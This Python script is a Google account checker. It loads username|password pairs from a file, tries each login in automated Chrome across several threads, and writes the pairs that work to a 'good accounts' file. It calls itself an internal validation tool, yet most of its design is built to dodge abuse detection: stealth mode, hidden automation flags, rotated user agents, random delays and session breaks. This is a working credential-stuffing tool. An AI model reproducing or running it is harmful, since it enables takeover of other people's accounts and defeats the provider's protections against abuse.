#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Google Account Checker - Improved Version
For internal Google Workspace domain account validation
"""

import json
import os
import sys
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Add utils to path
sys.path.insert(0, str(Path(__file__).parent))

from utils import BrowserManager, AccountValidator, Logger


class ImprovedAccountChecker:
    """Improved account checker with anti-detection and rate limiting"""

    def __init__(self, config_path='config/config.json'):
        # Load configuration
        self.config = self._load_config(config_path)

        # Initialize logger
        self.logger = Logger(
            log_file=self.config['files']['log_file'],
            console_output=True
        )

        # Statistics
        self.lock = threading.Lock()
        self.processed_count = 0
        self.success_count = 0
        self.wrong_password_count = 0
        self.captcha_count = 0
        self.phone_verification_count = 0
        self.error_count = 0

        # Results storage
        self.good_accounts = []
        self.failed_accounts = []

        # Rate limiting
        self.last_request_time = time.time()
        self.requests_this_minute = 0
        self.minute_start_time = time.time()

        # Session management
        self.session_count = 0

        # Start time
        self.start_time = datetime.now()

    def _load_config(self, config_path):
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
            return config
        except Exception as e:
            print(f"Error loading config: {e}")
            print("Using default configuration")
            return self._get_default_config()

    def _get_default_config(self):
        """Default configuration"""
        return {
            "performance": {"threads": 4, "headless": False, "disable_images": True,
                          "page_load_timeout": 10, "element_wait_timeout": 5},
            "anti_detection": {"random_delays": True, "min_delay_seconds": 1.5,
                             "max_delay_seconds": 3.5, "rotate_user_agents": True,
                             "use_stealth_mode": True, "session_break_after": 50,
                             "session_break_duration_seconds": 120},
            "rate_limiting": {"enabled": True, "max_accounts_per_minute": 12,
                            "cooldown_on_detection": 300},
            "files": {"input_file": "students_accounts.txt",
                     "output_good_accounts": "results/good_accounts.txt",
                     "output_failed_accounts": "results/failed_accounts.txt",
                     "output_report": "results/report.txt",
                     "log_file": "logs/checker.log",
                     "backup_interval": 100},
            "validation": {"save_wrong_password": False, "save_technical_errors": True,
                         "save_captcha_required": True, "save_phone_verification": True,
                         "check_login_success_urls": ["myaccount.google.com",
                                                     "accounts.google.com/ManageAccount",
                                                     "accounts.google.com/b/0"]},
            "chrome_options": {"window_size": "1920,1080", "disable_gpu": True,
                             "no_sandbox": True, "disable_dev_shm_usage": True,
                             "disable_blink_features": "AutomationControlled",
                             "exclude_switches": ["enable-automation"],
                             "use_automation_extension": False,
                             "remote_debugging_base_port": 9222}
        }

    def _apply_rate_limiting(self):
        """Apply rate limiting to avoid detection"""
        if not self.config['rate_limiting']['enabled']:
            return

        with self.lock:
            current_time = time.time()

            # Reset counter every minute
            if current_time - self.minute_start_time >= 60:
                self.requests_this_minute = 0
                self.minute_start_time = current_time

            # Check if we've hit the rate limit
            max_per_minute = self.config['rate_limiting']['max_accounts_per_minute']
            if self.requests_this_minute >= max_per_minute:
                # Calculate wait time
                elapsed = current_time - self.minute_start_time
                wait_time = 60 - elapsed

                if wait_time > 0:
                    self.logger.warning(f"Rate limit reached. Waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)

                    # Reset counter
                    self.requests_this_minute = 0
                    self.minute_start_time = time.time()

            self.requests_this_minute += 1

    def _check_session_break(self):
        """Check if we need a session break"""
        with self.lock:
            self.session_count += 1

            session_break_after = self.config['anti_detection']['session_break_after']
            if self.session_count >= session_break_after:
                break_duration = self.config['anti_detection']['session_break_duration_seconds']
                self.logger.warning(f"Session break - waiting {break_duration}s to avoid detection...")
                time.sleep(break_duration)
                self.session_count = 0

    def _update_stats(self, result):
        """Update statistics thread-safely"""
        with self.lock:
            self.processed_count += 1
            status = result['validation_result']['status']

            if status == 'success':
                self.success_count += 1
                if self.config['validation']['save_technical_errors'] or \
                   self.config['validation']['save_captcha_required'] or \
                   self.config['validation']['save_phone_verification']:
                    self.good_accounts.append(result)

            elif status == 'wrong_password':
                self.wrong_password_count += 1
                if self.config['validation']['save_wrong_password']:
                    self.failed_accounts.append(result)

            elif status == 'captcha':
                self.captcha_count += 1
                if self.config['validation']['save_captcha_required']:
                    self.good_accounts.append(result)

            elif status == 'phone_verification':
                self.phone_verification_count += 1
                if self.config['validation']['save_phone_verification']:
                    self.good_accounts.append(result)

            else:  # error
                self.error_count += 1
                if self.config['validation']['save_technical_errors']:
                    self.good_accounts.append(result)

    def test_account(self, account_data):
        """Test a single account"""
        username, password, index, thread_id = account_data

        result = {
            'username': username,
            'password': password,
            'index': index,
            'thread_id': thread_id,
            'validation_result': {}
        }

        driver = None

        try:
            # Apply rate limiting
            self._apply_rate_limiting()

            # Check session break
            self._check_session_break()

            # Create browser
            driver = BrowserManager.create_driver(self.config, thread_id)

            # Random delay before start
            BrowserManager.random_delay(self.config)

            # Validate account
            validation_result = AccountValidator.validate_account(
                driver, username, password, self.config
            )

            result['validation_result'] = validation_result

            # Log result
            status_emoji = {
                'success': '[OK]',
                'wrong_password': '[WRONG]',
                'captcha': '[CAPTCHA]',
                'phone_verification': '[PHONE]',
                'error': '[ERR]'
            }

            emoji = status_emoji.get(validation_result['status'], '[???]')
            self.logger.log(
                f"{emoji} #{index}: {username[:30]}... -> {validation_result['message']}",
                "SUCCESS" if validation_result['status'] == 'success' else "WARNING",
                thread_id
            )

            return result

        except Exception as e:
            result['validation_result'] = {
                'status': 'error',
                'message': f'Exception: {str(e)[:100]}',
                'details': ''
            }
            self.logger.error(f"#{index}: {username[:30]}... -> Exception: {str(e)[:50]}", thread_id)
            return result

        finally:
            BrowserManager.close_driver(driver)

    def load_accounts(self, input_file):
        """Load accounts from file"""
        self.logger.info(f"Loading accounts from {input_file}...")

        try:
            # Try from current directory first
            if os.path.exists(input_file):
                file_path = input_file
            # Try from parent runhere directory
            elif os.path.exists(f"../runhere/{input_file}"):
                file_path = f"../runhere/{input_file}"
            else:
                raise FileNotFoundError(f"Cannot find {input_file}")

            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            accounts = []
            for i, line in enumerate(lines):
                line = line.strip()
                if line and '|' in line and not line.startswith('#'):
                    parts = line.split('|', 1)
                    if len(parts) == 2:
                        username, password = parts
                        accounts.append((username.strip(), password.strip(), i + 1))

            self.logger.success(f"Loaded {len(accounts)} accounts")
            return accounts

        except Exception as e:
            self.logger.error(f"Error loading accounts: {e}")
            return []

    def save_results(self):
        """Save results to files"""
        self.logger.info("Saving results...")

        # Create results directory
        results_dir = os.path.dirname(self.config['files']['output_good_accounts'])
        if results_dir and not os.path.exists(results_dir):
            os.makedirs(results_dir, exist_ok=True)

        elapsed = datetime.now() - self.start_time
        total = self.processed_count

        # Save good accounts
        with open(self.config['files']['output_good_accounts'], 'w', encoding='utf-8') as f:
            f.write("# GOOD ACCOUNTS - Improved Checker\n")
            f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total processed: {total}\n")
            f.write(f"# Good accounts: {len(self.good_accounts)}\n\n")

            for acc in self.good_accounts:
                status = acc['validation_result']['status']
                msg = acc['validation_result']['message']
                f.write(f"{acc['username']}|{acc['password']}  # {status}: {msg}\n")

        # Save failed accounts
        if self.failed_accounts:
            with open(self.config['files']['output_failed_accounts'], 'w', encoding='utf-8') as f:
                f.write("# FAILED ACCOUNTS\n")
                f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

                for acc in self.failed_accounts:
                    status = acc['validation_result']['status']
                    msg = acc['validation_result']['message']
                    f.write(f"{acc['username']}|{acc['password']}  # {status}: {msg}\n")

        # Save report
        with open(self.config['files']['output_report'], 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("GOOGLE ACCOUNT CHECKER - IMPROVED VERSION - REPORT\n")
            f.write("=" * 80 + "\n\n")

            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Duration: {elapsed}\n")
            f.write(f"Threads: {self.config['performance']['threads']}\n\n")

            f.write("STATISTICS:\n")
            f.write(f"  Total processed: {total}\n")
            f.write(f"  Success: {self.success_count} ({self.success_count/total*100:.1f}%)\n")
            f.write(f"  Wrong password: {self.wrong_password_count} ({self.wrong_password_count/total*100:.1f}%)\n")
            f.write(f"  Captcha required: {self.captcha_count} ({self.captcha_count/total*100:.1f}%)\n")
            f.write(f"  Phone verification: {self.phone_verification_count} ({self.phone_verification_count/total*100:.1f}%)\n")
            f.write(f"  Technical errors: {self.error_count} ({self.error_count/total*100:.1f}%)\n\n")

            f.write(f"SAVED ACCOUNTS:\n")
            f.write(f"  Good accounts: {len(self.good_accounts)}\n")
            f.write(f"  Failed accounts: {len(self.failed_accounts)}\n\n")

            speed = total / elapsed.total_seconds() * 60 if elapsed.total_seconds() > 0 else 0
            f.write(f"PERFORMANCE:\n")
            f.write(f"  Speed: {speed:.2f} accounts/minute\n")
            f.write(f"  Avg time per account: {elapsed.total_seconds()/total:.2f}s\n")

        self.logger.success(f"Results saved to {self.config['files']['output_good_accounts']}")

    def run(self):
        """Main execution"""
        print("=" * 80)
        print("GOOGLE ACCOUNT CHECKER - IMPROVED VERSION")
        print("=" * 80)
        print("Features:")
        print("  - Anti-detection (random delays, user agents, stealth mode)")
        print("  - Rate limiting to avoid phone verification")
        print("  - Session breaks")
        print("  - Better error handling")
        print("  - Configurable via config.json")
        print("=" * 80)

        # Load accounts
        accounts = self.load_accounts(self.config['files']['input_file'])
        if not accounts:
            self.logger.error("No accounts to process!")
            return

        num_threads = self.config['performance']['threads']
        self.logger.info(f"Starting with {num_threads} threads...")

        # Prepare account data
        account_data = []
        for i, (username, password, index) in enumerate(accounts):
            thread_id = (i % num_threads) + 1
            account_data.append((username, password, index, thread_id))

        # Process with thread pool
        try:
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                future_to_account = {
                    executor.submit(self.test_account, data): data
                    for data in account_data
                }

                for future in as_completed(future_to_account):
                    try:
                        result = future.result()
                        self._update_stats(result)

                        # Progress every 10 accounts
                        if self.processed_count % 10 == 0:
                            elapsed = datetime.now() - self.start_time
                            speed = self.processed_count / elapsed.total_seconds() * 60 if elapsed.total_seconds() > 0 else 0
                            eta = (len(accounts) - self.processed_count) / (speed / 60) if speed > 0 else 0

                            self.logger.progress(
                                f"{self.processed_count}/{len(accounts)} | "
                                f"OK:{self.success_count} WRONG:{self.wrong_password_count} "
                                f"CAPTCHA:{self.captcha_count} PHONE:{self.phone_verification_count} "
                                f"ERR:{self.error_count} | {speed:.1f}/min | ETA:{eta:.0f}min"
                            )

                        # Backup
                        backup_interval = self.config['files']['backup_interval']
                        if self.processed_count % backup_interval == 0:
                            self.save_results()
                            self.logger.info(f"Backup saved at {self.processed_count} accounts")

                    except Exception as e:
                        self.logger.error(f"Error processing result: {e}")

        except KeyboardInterrupt:
            self.logger.warning("Stopped by user")

        # Final save
        self.save_results()

        # Final report
        elapsed = datetime.now() - self.start_time
        speed = len(accounts) / elapsed.total_seconds() * 60 if elapsed.total_seconds() > 0 else 0

        print("\n" + "=" * 80)
        print("COMPLETED!")
        print("=" * 80)
        print(f"Processed: {self.processed_count}/{len(accounts)}")
        print(f"Success: {self.success_count} ({self.success_count/self.processed_count*100:.1f}%)")
        print(f"Wrong password: {self.wrong_password_count}")
        print(f"Captcha: {self.captcha_count}")
        print(f"Phone verification: {self.phone_verification_count}")
        print(f"Errors: {self.error_count}")
        print(f"Duration: {elapsed}")
        print(f"Speed: {speed:.2f} accounts/minute")
        print("=" * 80)
        print(f"Results: {self.config['files']['output_good_accounts']}")
        print(f"Report: {self.config['files']['output_report']}")
        print("=" * 80)


def main():
    """Main entry point"""
    try:
        checker = ImprovedAccountChecker()
        checker.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
